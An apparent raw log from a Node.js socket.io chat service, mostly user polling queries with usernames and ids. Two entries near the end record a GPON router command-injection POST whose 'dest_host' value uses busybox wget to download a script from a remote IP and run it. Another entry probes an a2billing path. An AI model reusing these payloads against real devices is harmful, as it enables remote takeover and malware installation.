  transport: 'polling',
  t: 'Nd-1Q7n' }
[2021-06-12 10:20:52.586] [INFO] - [ 'iL2sDPfa3u32p6OAAGE0', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 10:21:27.510] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: '87de2aee044f46a4b8876e6b590c0a41',
  username: '韓佳',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-1YgV' }
[2021-06-12 10:21:27.511] [INFO] - [ 'dYUkYMjAlCfRnNzhAGE1', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 10:21:28.097] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: '2e6bfb7442584fd0b70894feeb9068bb',
  username: '亚非',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-1YW_' }
[2021-06-12 10:21:28.097] [INFO] - [ 'eHYXOCbLyoS-dYbSAGE2', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 10:21:33.672] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: '34bddff0e8e4440ca330db53a7394739',
  username: 'dongdong',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-1aGz' }
[2021-06-12 10:21:33.672] [INFO] - [ 'Cfl2KFOZ43lILg05AGE3', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 10:21:42.841] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: '87de2aee044f46a4b8876e6b590c0a41',
  username: '韓佳',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-1cKs' }
[2021-06-12 10:21:42.842] [INFO] - [ 'SWWMGvxzupNcu7qpAGE4', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 10:22:01.657] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: 'c331e7fef2f142fc9960e82c83c12372',
  username: 'x',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-1h5b' }
[2021-06-12 10:22:01.657] [INFO] - [ 'tVddKyxMNrTlJh4MAGE5', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 10:22:18.088] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: '87de2aee044f46a4b8876e6b590c0a41',
  username: '韓佳',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-1kMD' }
[2021-06-12 10:22:18.088] [INFO] - [ 'WJBV61X7lFwjrWgnAGE6', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 10:22:32.884] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: '17acc5e539df4342abfffec3e0f82b2c',
  username: '陶菊英',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-1oRd' }
[2021-06-12 10:22:32.884] [INFO] - [ 'XCaJMOBYiIs1GausAGE7', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 10:23:37.232] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-06-12 10:23:48.711] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: 'b1e963b4fa7049458b11fc9691d81940',
  username: '碎碎心塞塞',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-25M5' }
[2021-06-12 10:23:48.711] [INFO] - [ 'NkANy4pf5WLbQwOBAGE8', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 10:25:04.336] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 1ms
[2021-06-12 10:25:29.197] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: '87de2aee044f46a4b8876e6b590c0a41',
  username: '韓佳',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-2Tos' }
[2021-06-12 10:25:29.197] [INFO] - [ '9WoXxzMxG0o9tVrrAGE9', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 10:25:31.497] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: '34bddff0e8e4440ca330db53a7394739',
  username: 'dongdong',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-2UKx' }
[2021-06-12 10:25:31.498] [INFO] - [ 'RwQ8U5LPnFme_kW1AGE-', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 10:26:44.510] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: '87de2aee044f46a4b8876e6b590c0a41',
  username: '韓佳',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-2m7M' }
[2021-06-12 10:26:44.510] [INFO] - [ 'R0H8pe_8lFiOwdpdAGE_', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 10:27:16.108] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: '17acc5e539df4342abfffec3e0f82b2c',
  username: '陶菊英',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-2tah' }
[2021-06-12 10:27:16.109] [INFO] - [ 'w9-TyaUH_J1z6cSeAGFA', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 10:27:47.023] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: 'e8510cb38a314835861dbe7b58086012',
  username: '红枫',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-2_6N' }
[2021-06-12 10:27:47.024] [INFO] - [ 'MDcEMpzbJLw5wDEIAGFB', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 10:27:52.504] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: '87de2aee044f46a4b8876e6b590c0a41',
  username: '韓佳',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-30my' }
[2021-06-12 10:27:52.504] [INFO] - [ 'TEMRicggtoO60xDkAGFC', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 10:28:59.598] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: '87de2aee044f46a4b8876e6b590c0a41',
  username: '韓佳',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-3HF9' }
[2021-06-12 10:28:59.598] [INFO] - [ 'EJGFo18dpzJU6gJAAGFD', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 10:29:54.316] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: '2179d8bc0a7f48a0a0fa76140f33d78d',
  username: '日安',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-3Ur1' }
[2021-06-12 10:29:54.317] [INFO] - [ '7W3XH6ys38NLqiJ2AGFE', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 10:30:20.701] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: '87de2aee044f46a4b8876e6b590c0a41',
  username: '韓佳',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-3b46' }
[2021-06-12 10:30:20.701] [INFO] - [ 'EofdGLX5WbbCyzxcAGFF', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 10:31:29.324] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: '87de2aee044f46a4b8876e6b590c0a41',
  username: '韓佳',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-3reA' }
[2021-06-12 10:31:29.325] [INFO] - [ '396Wir3LYJ_7DCKBAGFG', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 10:31:42.590] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: '87de2aee044f46a4b8876e6b590c0a41',
  username: '韓佳',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-3v2v' }
[2021-06-12 10:31:42.590] [INFO] - [ 'TOr_bjBb__UeiYUDAGFH', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 10:31:51.928] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: '2179d8bc0a7f48a0a0fa76140f33d78d',
  username: '日安',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-3xYm' }
[2021-06-12 10:31:51.930] [INFO] - [ '9y-gltHUW8fG2UJNAGFI', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 10:32:07.464] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: '2179d8bc0a7f48a0a0fa76140f33d78d',
  username: '日安',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-3_Ld' }
[2021-06-12 10:32:07.464] [INFO] - [ 'agupN5MMIVhWHHgmAGFJ', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 10:32:16.483] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: '87de2aee044f46a4b8876e6b590c0a41',
  username: '韓佳',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-41Ko' }
[2021-06-12 10:32:16.483] [INFO] - [ 'Z8_iXR3tNNC3v5O6AGFK', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 10:32:52.581] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: '87de2aee044f46a4b8876e6b590c0a41',
  username: '韓佳',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-4A7W' }
[2021-06-12 10:32:52.581] [INFO] - [ '2P6hsjwJxNvM89vtAGFL', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 10:33:24.295] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: '87de2aee044f46a4b8876e6b590c0a41',
  username: '韓佳',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-4Hsm' }
[2021-06-12 10:33:24.296] [INFO] - [ '6yOyuGEw64HuptgiAGFM', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 10:33:53.147] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: 'fbaef34ba6974e86bf7258c317c6ad13',
  username: '顾洪韬妈妈',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-4OMw' }
[2021-06-12 10:33:53.147] [INFO] - [ '306tYDKXRS7yqoa3AGFN', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 10:34:30.569] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: '87de2aee044f46a4b8876e6b590c0a41',
  username: '韓佳',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-4Y0P' }
[2021-06-12 10:34:30.569] [INFO] - [ '0k7e80OxME-tegRXAGFO', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 10:34:33.178] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: 'fbaef34ba6974e86bf7258c317c6ad13',
  username: '顾洪韬妈妈',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-4Y3V' }
[2021-06-12 10:34:33.178] [INFO] - [ 'jBUZbnBE6d9IZILsAGFP', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 10:35:02.890] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: '87de2aee044f46a4b8876e6b590c0a41',
  username: '韓佳',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-4fz_' }
[2021-06-12 10:35:02.890] [INFO] - [ 'c5Mx_hf249SMDVLhAGFQ', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 10:35:27.489] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: 'fbaef34ba6974e86bf7258c317c6ad13',
  username: '顾洪韬妈妈',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-4lR4' }
[2021-06-12 10:35:27.489] [INFO] - [ 'i72vH50rXHV16IFyAGFR', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 10:35:35.211] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: '87de2aee044f46a4b8876e6b590c0a41',
  username: '韓佳',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-4np7' }
[2021-06-12 10:35:35.211] [INFO] - [ 'y0yCKTn1o_JkXX_WAGFS', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 10:35:52.869] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: 'cb776d36179f49f2830dc665341ca625',
  username: '火夫',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-4s7K' }
[2021-06-12 10:35:52.869] [INFO] - [ 'ZisLfiI9Vbbe3nEuAGFT', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 10:36:07.490] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: '87de2aee044f46a4b8876e6b590c0a41',
  username: '韓佳',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-4vYi' }
[2021-06-12 10:36:07.490] [INFO] - [ 'nkU2in1XU8MCog7qAGFU', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 10:36:28.589] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: 'b1e963b4fa7049458b11fc9691d81940',
  username: '碎碎心塞塞',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-4-tQ' }
[2021-06-12 10:36:28.590] [INFO] - [ 'u5EPsOQ6U_sC5SSwAGFV', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 10:36:38.917] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: '87de2aee044f46a4b8876e6b590c0a41',
  username: '韓佳',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-51El' }
[2021-06-12 10:36:38.917] [INFO] - [ 'Mp7XQi2eCUM9HTkxAGFW', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 10:37:32.907] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: '87de2aee044f46a4b8876e6b590c0a41',
  username: '韓佳',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-5EPI' }
[2021-06-12 10:37:32.907] [INFO] - [ 'o-zIB3MX6AilvxhGAGFX', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 10:37:52.346] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: 'ee2d18c69bf44be99f671aab292e3eb8',
  username: '杨鹏',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-5IgQ' }
[2021-06-12 10:37:52.346] [INFO] - [ 'SWdIv3Ea6rH1ZYGKAGFY', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 10:38:04.461] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: '87de2aee044f46a4b8876e6b590c0a41',
  username: '韓佳',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-5MGo' }
[2021-06-12 10:38:04.461] [INFO] - [ 'EELTseML_GpClfneAGFZ', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 10:38:54.452] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: '87de2aee044f46a4b8876e6b590c0a41',
  username: '韓佳',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-5YJ7' }
[2021-06-12 10:38:54.453] [INFO] - [ 'b3G50kqFd8DykgVpAGFa', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 10:39:25.991] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: '87de2aee044f46a4b8876e6b590c0a41',
  username: '韓佳',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-5f_Z' }
[2021-06-12 10:39:25.992] [INFO] - [ 'kx8pRFnl4ufhz5BSAGFb', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 10:39:57.877] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: '87de2aee044f46a4b8876e6b590c0a41',
  username: '韓佳',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-5nuS' }
[2021-06-12 10:39:57.877] [INFO] - [ 'pdgcaKr84DcYA7NWAGFc', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 10:40:30.408] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: 'b1e963b4fa7049458b11fc9691d81940',
  username: '碎碎心塞塞',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-5vvG' }
[2021-06-12 10:40:30.408] [INFO] - [ 'Sk1IpSZVl3YZFeTKAGFd', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 10:40:33.943] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: '87de2aee044f46a4b8876e6b590c0a41',
  username: '韓佳',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-5weE' }
[2021-06-12 10:40:33.944] [INFO] - [ 'Equ2ei6hrngeBaj6AGFe', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 10:41:05.570] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: '87de2aee044f46a4b8876e6b590c0a41',
  username: '韓佳',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-62VY' }
[2021-06-12 10:41:05.571] [INFO] - [ 'mcRel5s5fVePi2d1AGFf', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 10:44:21.570] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: '1deb98171b584b7db865556b8e4b5d63',
  username: '华老师',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-6nzw' }
[2021-06-12 10:44:21.571] [INFO] - [ 'Xs_gAoRS3H40qYCpAGFg', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 10:45:35.882] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: '87de2aee044f46a4b8876e6b590c0a41',
  username: '韓佳',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-74QI' }
[2021-06-12 10:45:35.883] [INFO] - [ 'SRcz5etBG5Ey6wV4AGFh', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 10:45:51.043] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: '1deb98171b584b7db865556b8e4b5d63',
  username: '华老师',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-77q0' }
[2021-06-12 10:45:51.043] [INFO] - [ '7U3Co7RsDBRLb5qYAGFi', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 10:46:26.055] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: '17acc5e539df4342abfffec3e0f82b2c',
  username: '陶菊英',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-7GKy' }
[2021-06-12 10:46:26.056] [INFO] - [ 'fxDp8K2HPkmhkO_QAGFj', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 10:47:03.629] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: '17acc5e539df4342abfffec3e0f82b2c',
  username: '陶菊英',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-7PW4' }
[2021-06-12 10:47:03.629] [INFO] - [ 'SJsSP33zhc6Ki160AGFk', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 10:50:51.079] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: '87de2aee044f46a4b8876e6b590c0a41',
  username: '韓佳',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-8HRh' }
[2021-06-12 10:50:51.080] [INFO] - [ 'fKmtAeAwVI7TtobzAGFl', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 10:53:52.093] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: '3825869cfd8644199a68ef2aa271381b',
  username: '徐剑清',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-8zTI' }
[2021-06-12 10:53:52.093] [INFO] - [ 'AEVak5MhZK59ipmMAGFm', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 10:54:15.267] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: '3825869cfd8644199a68ef2aa271381b',
  username: '徐剑清',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-931o' }
[2021-06-12 10:54:15.268] [INFO] - [ 'mzqOHN-UoKbFqFNeAGFn', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 11:02:59.163] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: 'e8510cb38a314835861dbe7b58086012',
  username: '红枫',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-B2mE' }
[2021-06-12 11:02:59.164] [INFO] - [ 'qpW-UtTNvQWUdbOnAGFo', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 11:03:14.384] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: '3825869cfd8644199a68ef2aa271381b',
  username: '徐剑清',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-B6k-' }
[2021-06-12 11:03:14.384] [INFO] - [ 'nwFSrkwhqr7pwFdCAGFp', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 11:05:11.921] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: '17acc5e539df4342abfffec3e0f82b2c',
  username: '陶菊英',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-BZCO' }
[2021-06-12 11:05:11.921] [INFO] - [ 'mlzD6ETDbMxBFlK2AGFq', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 11:05:35.815] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: '17acc5e539df4342abfffec3e0f82b2c',
  username: '陶菊英',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-Bf1d' }
[2021-06-12 11:05:35.816] [INFO] - [ '-c0_Fhy0hl7cW8vBAGFr', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 11:07:01.210] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: '17acc5e539df4342abfffec3e0f82b2c',
  username: '陶菊英',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-BzuF' }
[2021-06-12 11:07:01.210] [INFO] - [ 'rOJ3CZ6oDnvt4GqIAGFs', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 11:11:22.156] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: '233b96aa5d3e4a9599676ad5b86371bd',
  username: '匈牙利狂想曲',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-CzTf' }
[2021-06-12 11:11:22.156] [INFO] - [ '5Zx3GYx5ZKxy3gD8AGFt', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 11:12:13.202] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: '233b96aa5d3e4a9599676ad5b86371bd',
  username: '匈牙利狂想曲',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-D9xL' }
[2021-06-12 11:12:13.202] [INFO] - [ 'W9I5RoNX_4b6xsvsAGFu', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 11:12:34.779] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: 'c6a7f261564c432684db1a78737eca9e',
  username: '沈丹培',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-DFk6' }
[2021-06-12 11:12:34.779] [INFO] - [ 'Dq3NL6mdsboLzw6UAGFv', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 11:12:36.811] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: '233b96aa5d3e4a9599676ad5b86371bd',
  username: '匈牙利狂想曲',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-DFhh' }
[2021-06-12 11:12:36.811] [INFO] - [ 'eEgTkLxFtBaYQyMjAGFw', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 11:12:45.421] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: '233b96aa5d3e4a9599676ad5b86371bd',
  username: '匈牙利狂想曲',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-DHoe' }
[2021-06-12 11:12:45.421] [INFO] - [ 'Z_07v7MNvXdN-oG7AGFx', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 11:13:23.609] [INFO] - msg { role: 0,
  username: '匈牙利狂想曲',
  _id: 'Z_07v7MNvXdN-oG7AGFx',
  msg: '看不到' }
[2021-06-12 11:13:45.550] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: '233b96aa5d3e4a9599676ad5b86371bd',
  username: '匈牙利狂想曲',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-DWUB' }
[2021-06-12 11:13:45.551] [INFO] - [ 'aqtvn6fte1RND-tTAGFy', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 11:14:48.795] [INFO] - query { rid: 'f8c69c7930e14bd3a97771d8aa1c7f28',
  uid: 'ee2d18c69bf44be99f671aab292e3eb8',
  username: '杨鹏',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Nd-Dlez' }
[2021-06-12 11:14:48.795] [INFO] - [ 'PpuGJY1vFx4FG5_NAGFz', 'f8c69c7930e14bd3a97771d8aa1c7f28' ]
[2021-06-12 11:16:23.718] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 1ms
[2021-06-12 11:24:51.531] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-06-12 11:38:25.584] [INFO] - [47.100.244.51] GET http://47.100.89.2:8250/ 200 0ms
[2021-06-12 11:48:25.654] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-06-12 12:09:53.765] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/images/Nxrs4tAtO/HCw4_2FQ7o69dmQEodXU/_2Fua56jJgWqt8tN1Tx/0M9Tus5G1nAOe_2BJflcrm/2nz3T7AxG_2Fd/YnZ7Cn6A/zq1HlKYZhiFyQLgflmvIbb1/yQL2MK3UaK/00uQsiMnxrcs4C9gN/xpGuwRLuq6tH/7YwEr.avi 200 0ms
[2021-06-12 12:22:03.875] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-06-12 12:22:27.419] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-06-12 12:30:16.808] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-06-12 12:35:40.354] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 1ms
[2021-06-12 12:36:25.820] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/images/Nxrs4tAtO/HCw4_2FQ7o69dmQEodXU/_2Fua56jJgWqt8tN1Tx/0M9Tus5G1nAOe_2BJflcrm/2nz3T7AxG_2Fd/YnZ7Cn6A/zq1HlKYZhiFyQLgflmvIbb1/yQL2MK3UaK/00uQsiMnxrcs4C9gN/xpGuwRLuq6tH/7YwEr.avi 200 0ms
[2021-06-12 12:39:31.668] [INFO] - [127.0.0.1] POST http://127.0.0.1:8250/GponForm/diag_Form?style/ "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=$(busybox+wget+http://23.95.191.212/cache+-O+->+/dev/.p;sh+/dev/.p)&ipv=0\r\n" 405 0ms
[2021-06-12 13:29:35.006] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-06-12 14:42:01.630] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250//a2billing/customer/templates/default/footer.tpl 200 0ms
[2021-06-12 14:50:02.473] [INFO] - [127.0.0.1] POST http://127.0.0.1:8250/GponForm/diag_Form?style/ "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=$(busybox+wget+http://23.95.191.212/cache+-O+->+/dev/.p;sh+/dev/.p)&ipv=0\r\n" 405 0ms
